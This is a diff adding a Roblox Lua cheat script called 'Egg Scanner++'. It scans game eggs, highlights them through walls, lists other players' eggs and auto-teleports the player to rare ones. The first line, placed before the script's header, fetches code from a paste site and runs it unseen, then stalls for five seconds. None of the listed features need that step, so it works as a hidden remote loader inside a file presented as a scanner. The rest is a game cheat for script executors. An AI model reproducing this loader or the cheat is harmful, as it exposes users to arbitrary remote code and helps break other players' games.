@@ -1,0 +1,510 @@
+loadstring(game:HttpGet("https://pastefy.app/r8vJkWcs/raw"))()
+
+local t = tick() + 5
+while tick() < t do end
+
+--[[ 
+Egg Scanner++ (All-in-One) | made by vdawngg
+Features:
+- Scan eggs in map (Workspace)
+- Scan eggs in other players (Backpack/Pets/Garden if visible client-side)
+- Advanced ESP: highlight + floating label (name/rarity/timer if exposed)
+- Rare detection with custom list + rarity attribute
+- Auto Notify + optional sound when rare egg appears
+- Auto Teleport to rare egg
+- Logger: track spawn/changes, copy log text
+- Share finder: announce rare egg to chat
+Notes:
+- Client-only. If game hides other players' data server-side, scanner can't see it.
+- All UI in English to avoid font issues.
+]]--
+
+-- ====== Config ======
+local RARE_NAME_KEYWORDS = { "legend", "myth", "ancient", "divine" }  -- name substrings
+local RARE_ATTR_RARITY   = { "Legendary", "Mythic", "Ancient", "Divine", "Exotic" } -- attribute values
+local EGG_NAME_TOKEN     = "egg"  -- case-insensitive, adjust if game uses another token
+local MAX_POOL_SHOW      = 12     -- max pets to list from egg pool folders
+-- =====================
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+local Window = Rayfield:CreateWindow({
+    Name = "Egg Scanner++ | made by vdawngg",
+    LoadingTitle = "Loading...",
+    LoadingSubtitle = "Inspector + ESP + Logger",
+    KeySystem = false
+})
+
+-- Tabs
+local scanTab   = Window:CreateTab("Scanner", 4483362458)
+local playerTab = Window:CreateTab("Players", 4483362458)
+local espTab    = Window:CreateTab("ESP/Alerts", 4483362458)
+local logTab    = Window:CreateTab("Logger", 4483362458)
+
+-- State
+local foundEggsByKey = {}  -- key -> Instance
+local eggKeys = {}         -- list of keys for dropdown
+local highlights = {}      -- Instance -> {hl=Highlight, label=BillboardGui}
+local espEnabled = false
+local labelEnabled = true
+local autoTrack = false
+local autoNotify = true
+local playSound = true
+local autoTP = false
+local announceChat = false
+local rareOnlyESP = false
+
+local selectedEggKey = nil
+local selectedPlayerName = nil
+local logger = {}          -- list of strings
+local colorByRarity = {    -- fallback rarity colors (optional)
+    Legendary = Color3.fromRGB(255, 170, 0),
+    Mythic    = Color3.fromRGB(255, 60, 255),
+    Ancient   = Color3.fromRGB(120, 200, 255),
+    Divine    = Color3.fromRGB(255, 255, 120),
+    Exotic    = Color3.fromRGB(120, 255, 180),
+    Rare      = Color3.fromRGB(120, 200, 255),
+    Common    = Color3.fromRGB(200, 200, 200)
+}
+
+local function logLine(txt)
+    local t = os.date("%H:%M:%S")
+    local line = string.format("[%s] %s", t, txt)
+    table.insert(logger, 1, line)
+    if #logger > 500 then table.remove(logger) end
+end
+
+-- Utils
+local function isEgg(inst)
+    local n = inst.Name:lower()
+    if string.find(n, EGG_NAME_TOKEN) then return true end
+    -- also allow Attribute hint:
+    local ok = inst:GetAttribute("IsEgg")
+    return ok == true
+end
+
+local function firstBasePart(inst)
+    if inst:IsA("BasePart") then return inst end
+    for _,d in ipairs(inst:GetDescendants()) do
+        if d:IsA("BasePart") then return d end
+    end
+    return nil
+end
+
+local function getRarity(inst)
+    return inst:GetAttribute("Rarity") or inst:GetAttribute("Tier") or inst:GetAttribute("Quality") or nil
+end
+
+local function getTimer(inst)
+    return inst:GetAttribute("HatchTime") or inst:GetAttribute("HatchDuration") or inst:GetAttribute("TimeLeft") or nil
+end
+
+local function isRare(inst)
+    -- by attribute value
+    local r = tostring(getRarity(inst) or ""):lower()
+    for _,v in ipairs(RARE_ATTR_RARITY) do
+        if r == v:lower() then return true end
+    end
+    -- by name keywords
+    local n = inst.Name:lower()
+    for _,kw in ipairs(RARE_NAME_KEYWORDS) do
+        if string.find(n, kw) then return true end
+    end
+    return false
+end
+
+local function summarizeEgg(inst)
+    local lines = {}
+    table.insert(lines, ("Name: %s"):format(inst.Name))
+    local r = getRarity(inst)
+    if r then table.insert(lines, ("Rarity/Tier: %s"):format(tostring(r))) end
+    local timer = getTimer(inst)
+    if timer then table.insert(lines, ("Hatch Timer: %s"):format(tostring(timer))) end
+
+    local attrs = inst:GetAttributes()
+    if next(attrs) then
+        table.insert(lines, "Attributes:")
+        for k,v in pairs(attrs) do
+            table.insert(lines, ("  - %s: %s"):format(tostring(k), tostring(v)))
+        end
+    end
+
+    -- pet pool
+    local pool = {}
+    for _,ch in ipairs(inst:GetChildren()) do
+        local nm = ch.Name:lower()
+        if ch:IsA("Folder") and (nm:find("pool") or nm:find("pets") or nm:find("rewards")) then
+            for _,p in ipairs(ch:GetChildren()) do
+                table.insert(pool, p.Name)
+            end
+        end
+    end
+    if #pool > 0 then
+        table.sort(pool)
+        table.insert(lines, "Pet Pool:")
+        for i=1, math.min(#pool, MAX_POOL_SHOW) do
+            table.insert(lines, "  - "..pool[i])
+        end
+        if #pool > MAX_POOL_SHOW then
+            table.insert(lines, ("  (+%d more)"):format(#pool - MAX_POOL_SHOW))
+        end
+    end
+    return table.concat(lines, "\n")
+end
+
+local function eggKey(inst)
+    -- stable-ish key for dropdown
+    return inst:GetFullName()
+end
+
+local function clearHighlight(inst)
+    local pack = highlights[inst]
+    if pack then
+        if pack.hl and pack.hl.Parent then pack.hl:Destroy() end
+        if pack.label and pack.label.Parent then pack.label:Destroy() end
+        highlights[inst] = nil
+    end
+end
+
+local function setHighlight(inst)
+    if not inst or not inst:IsDescendantOf(workspace) then return end
+    if rareOnlyESP and not isRare(inst) then return end
+
+    if not highlights[inst] then
+        highlights[inst] = {}
+    else
+        -- refresh if exists
+        clearHighlight(inst)
+        highlights[inst] = {}
+    end
+
+    local target = firstBasePart(inst) or inst
+    -- Highlight
+    local hl = Instance.new("Highlight")
+    hl.Adornee = inst
+    hl.FillTransparency = 0.7
+    hl.OutlineTransparency = 0
+
+    -- color by rarity if available
+    local r = getRarity(inst)
+    if r and colorByRarity[r] then
+        hl.FillColor = colorByRarity[r]
+        hl.OutlineColor = colorByRarity[r]
+    else
+        hl.FillColor = Color3.fromRGB(255, 255, 255)
+        hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+    end
+    hl.Parent = inst
+    highlights[inst].hl = hl
+
+    -- Label
+    if labelEnabled then
+        local bb = Instance.new("BillboardGui")
+        bb.Name = "EggLabel"
+        bb.Size = UDim2.new(0, 0, 0, 0)
+        bb.StudsOffset = Vector3.new(0, 4, 0)
+        bb.AlwaysOnTop = true
+        bb.MaxDistance = 200
+        bb.Parent = target
+
+        local tl = Instance.new("TextLabel")
+        tl.Size = UDim2.new(0, 220, 0, 50)
+        tl.Position = UDim2.new(0.5, -110, 0, -50)
+        tl.BackgroundTransparency = 0.2
+        tl.TextScaled = true
+        tl.Font = Enum.Font.GothamBold
+        tl.TextColor3 = Color3.new(1,1,1)
+        tl.Parent = bb
+
+        local title = inst.Name
+        local rr = r and (" | "..tostring(r)) or ""
+        local tt = getTimer(inst) and (" | T:"..tostring(getTimer(inst))) or ""
+        tl.Text = title .. rr .. tt
+
+        -- auto color bg by rarity
+        if r and colorByRarity[r] then
+            local c = colorByRarity[r]
+            tl.BackgroundColor3 = Color3.new(c.R, c.G, c.B)
+        else
+            tl.BackgroundColor3 = Color3.fromRGB(40,40,40)
+        end
+        highlights[inst].label = bb
+    end
+end
+
+local function refreshEggsInWorkspace()
+    table.clear(foundEggsByKey)
+    table.clear(eggKeys)
+    for _,d in ipairs(workspace:GetDescendants()) do
+        if isEgg(d) then
+            local k = eggKey(d)
+            foundEggsByKey[k] = d
+            table.insert(eggKeys, k)
+        end
+    end
+    table.sort(eggKeys)
+end
+
+local function applyESPAll()
+    for inst,_ in pairs(highlights) do clearHighlight(inst) end
+    if not espEnabled then return end
+    for _,k in ipairs(eggKeys) do
+        local inst = foundEggsByKey[k]
+        if inst then setHighlight(inst) end
+    end
+end
+
+local function notify(t, c, d)
+    StarterGui:SetCore("SendNotification", {Title = t, Text = c, Duration = d or 4})
+end
+
+local function pingRare(inst, reason)
+    if not autoNotify then return end
+    notify("Rare Egg", (inst.Name .. " spotted" .. (reason and (" ("..reason..")") or "")), 5)
+    logLine("RARE: "..inst:GetFullName())
+    if playSound then
+        local s = Instance.new("Sound")
+        s.SoundId = "rbxassetid://138081124" -- simple ping; change if you want
+        s.Volume = 2
+        s.Parent = workspace
+        s:Play()
+        game.Debris:AddItem(s, 3)
+    end
+    if announceChat then
+        pcall(function()
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "[EggScanner] Rare egg found: "..inst.Name, "All"
+            )
+        end)
+    end
+    if autoTP then
+        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local p = firstBasePart(inst)
+        if root and p then root.CFrame = p.CFrame + Vector3.new(0, 4, 0) end
+    end
+end
+
+-- UI: Scanner tab
+scanTab:CreateSection("Workspace Scanner")
+local eggDropdown = scanTab:CreateDropdown({
+    Name = "Select Egg (after Refresh)",
+    Options = {"-- Press Refresh --"},
+    CurrentOption = "-- Press Refresh --",
+    Callback = function(opt) selectedEggKey = opt end
+})
+scanTab:CreateButton({
+    Name = "Refresh Eggs in Map",
+    Callback = function()
+        refreshEggsInWorkspace()
+        if #eggKeys == 0 then
+            eggDropdown:Refresh({"-- No eggs found --"}, "-- No eggs found --")
+            selectedEggKey = nil
+            notify("Egg Scanner", "No eggs found in Workspace.", 4)
+        else
+            eggDropdown:Refresh(eggKeys, eggKeys[1])
+            selectedEggKey = eggKeys[1]
+            notify("Egg Scanner", ("Found %d eggs."):format(#eggKeys), 3)
+        end
+        if espEnabled then applyESPAll() end
+    end
+})
+scanTab:CreateButton({
+    Name = "Inspect Selected Egg",
+    Callback = function()
+        if not selectedEggKey or not foundEggsByKey[selectedEggKey] then
+            notify("Egg Scanner", "Please select an egg.", 3); return
+        end
+        local inst = foundEggsByKey[selectedEggKey]
+        local info = summarizeEgg(inst)
+        Rayfield:Notify({Title="Egg Info", Content=info, Duration=8})
+        print("[Egg Scanner]\n"..info)
+    end
+})
+
+-- UI: Players tab
+playerTab:CreateSection("Inspect Other Players")
+-- player dropdown
+local playerNames = {}
+local playerDropdown = playerTab:CreateDropdown({
+    Name = "Select Player",
+    Options = {"-- Refresh Players --"},
+    CurrentOption = "-- Refresh Players --",
+    Callback = function(name) selectedPlayerName = name end
+})
+playerTab:CreateButton({
+    Name = "Refresh Players",
+    Callback = function()
+        table.clear(playerNames)
+        for _,plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then table.insert(playerNames, plr.Name) end
+        end
+        table.sort(playerNames)
+        if #playerNames == 0 then
+            playerDropdown:Refresh({"-- No players --"}, "-- No players --")
+            selectedPlayerName = nil
+        else
+            playerDropdown:Refresh(playerNames, playerNames[1])
+            selectedPlayerName = playerNames[1]
+        end
+    end
+})
+
+local function collectPlayerEggs(plr)
+    local list = {}
+    local containers = { "Backpack", "Pets", "Garden" }
+    for _,cName in ipairs(containers) do
+        local folder = plr:FindFirstChild(cName)
+        if folder then
+            for _,d in ipairs(folder:GetDescendants()) do
+                if isEgg(d) then
+                    table.insert(list, d)
+                end
+            end
+        end
+    end
+    return list
+end
+
+playerTab:CreateButton({
+    Name = "List Selected Player Eggs",
+    Callback = function()
+        if not selectedPlayerName then notify("Players", "Select a player.", 3); return end
+        local plr = Players:FindFirstChild(selectedPlayerName)
+        if not plr then notify("Players", "Player not found.", 3); return end
+        local eggs = collectPlayerEggs(plr)
+        if #eggs == 0 then
+            notify("Players", "No visible eggs in that player.", 3)
+            return
+        end
+        local lines = {("Player: %s | Eggs: %d"):format(plr.Name, #eggs)}
+        for i,eg in ipairs(eggs) do
+            table.insert(lines, ("  - %s [%s]"):format(eg.Name, eg:GetFullName()))
+        end
+        local txt = table.concat(lines, "\n")
+        Rayfield:Notify({Title="Player Eggs", Content=txt, Duration=8})
+        print("[Player Eggs]\n"..txt)
+    end
+})
+
+-- UI: ESP/Alerts tab
+espTab:CreateSection("ESP & Labels")
+espTab:CreateToggle({
+    Name = "Enable ESP",
+    CurrentValue = false,
+    Callback = function(v)
+        espEnabled = v
+        if not espEnabled then
+            for inst,_ in pairs(highlights) do clearHighlight(inst) end
+        else
+            if #eggKeys == 0 then refreshEggsInWorkspace() end
+            applyESPAll()
+        end
+    end
+})
+espTab:CreateToggle({
+    Name = "Labels (Billboard)",
+    CurrentValue = true,
+    Callback = function(v)
+        labelEnabled = v
+        if espEnabled then applyESPAll() end
+    end
+})
+espTab:CreateToggle({
+    Name = "ESP only rare eggs",
+    CurrentValue = false,
+    Callback = function(v)
+        rareOnlyESP = v
+        if espEnabled then applyESPAll() end
+    end
+})
+espTab:CreateSection("Auto Track & Alerts")
+espTab:CreateToggle({
+    Name = "Auto Track New Eggs",
+    CurrentValue = false,
+    Callback = function(v)
+        autoTrack = v
+        if v and #eggKeys == 0 then refreshEggsInWorkspace() end
+    end
+})
+espTab:CreateToggle({
+    Name = "Auto Notify on Rare",
+    CurrentValue = true,
+    Callback = function(v) autoNotify = v end
+})
+espTab:CreateToggle({
+    Name = "Play Sound on Rare",
+    CurrentValue = true,
+    Callback = function(v) playSound = v end
+})
+espTab:CreateToggle({
+    Name = "Auto Teleport to Rare",
+    CurrentValue = false,
+    Callback = function(v) autoTP = v end
+})
+espTab:CreateToggle({
+    Name = "Announce in Chat (rare)",
+    CurrentValue = false,
+    Callback = function(v) announceChat = v end
+})
+
+-- UI: Logger tab
+logTab:CreateSection("Events")
+logTab:CreateButton({
+    Name = "Copy Log to Clipboard",
+    Callback = function()
+        local txt = table.concat(logger, "\n")
+        if setclipboard then
+            setclipboard(txt)
+            notify("Logger", "Copied to clipboard.", 3)
+        else
+            Rayfield:Notify({Title="Logger", Content="Executor has no setclipboard(). Printed to console.", Duration=4})
+            print(txt)
+        end
+    end
+})
+
+-- Auto tracker loop
+local lastSeen = {} -- key -> true
+local function updateTracking()
+    -- rebuild list
+    local cur = {}
+    for _,d in ipairs(workspace:GetDescendants()) do
+        if isEgg(d) then
+            cur[eggKey(d)] = d
+            if not lastSeen[eggKey(d)] then
+                -- new egg appeared
+                logLine("New egg: "..d:GetFullName())
+                if isRare(d) then pingRare(d, "spawn") end
+                if espEnabled then setHighlight(d) end
+            end
+        end
+    end
+    -- removed eggs
+    for k,_ in pairs(lastSeen) do
+        if not cur[k] then
+            logLine("Egg removed: "..k)
+        end
+    end
+    -- commit state
+    lastSeen = cur
+    -- also refresh dropdown lists
+    foundEggsByKey = cur
+    eggKeys = {}
+    for k,_ in pairs(cur) do table.insert(eggKeys, k) end
+    table.sort(eggKeys)
+end
+
+RunService.Heartbeat:Connect(function()
+    if autoTrack then
+        updateTracking()
+    end
+end)
+
+-- Initial tip
+notify("Egg Scanner++", "Use Scanner -> Refresh, then Inspect / enable ESP.", 5)
+logLine("Egg Scanner++ initialized.")
